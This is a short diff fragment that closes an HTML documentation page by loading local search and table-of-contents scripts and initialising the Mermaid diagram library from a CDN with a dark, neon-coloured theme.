+<script src="../search-data.js"></script>
+<script src="../../search.js"></script>
+<script src="../../toc.js"></script>
+<script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';
+  mermaid.initialize({
+    startOnLoad: true,
+    theme: 'base',
+    themeVariables: {
+      darkMode: true, background: '#131a1e', primaryColor: '#1d262b',
+      primaryTextColor: '#e8eef0', primaryBorderColor: '#00ff9c',
+      lineColor: '#00e6ff', secondaryColor: '#11171a', tertiaryColor: '#161d21',
+      mainBkg: '#1d262b', nodeBorder: '#00ff9c', clusterBkg: '#0b0f10',
+      clusterBorder: '#243035', titleColor: '#00ff9c',
+      edgeLabelBackground: '#0b0f10', textColor: '#e8eef0',
+      labelTextColor: '#e8eef0', actorBkg: '#1d262b', actorBorder: '#00ff9c',
+      actorTextColor: '#00ff9c', actorLineColor: '#00e6ff',
+      signalColor: '#e8eef0', signalTextColor: '#e8eef0',
+      labelBoxBkgColor: '#1d262b', labelBoxBorderColor: '#00ff9c',
+      noteBkgColor: '#ffe066', noteTextColor: '#0b0f10', noteBorderColor: '#ffe066',
+      activationBkgColor: '#1d262b', activationBorderColor: '#00ff9c',
+      sequenceNumberColor: '#0b0f10'
+    },
+    flowchart: { curve: 'basis', padding: 16 },
+    sequence: { mirrorActors: false, bottomMarginAdj: 10 },
+    fontFamily: 'JetBrains Mono, Cascadia Code, Consolas, monospace'
+  });
+</script>
+</body>
+</html>
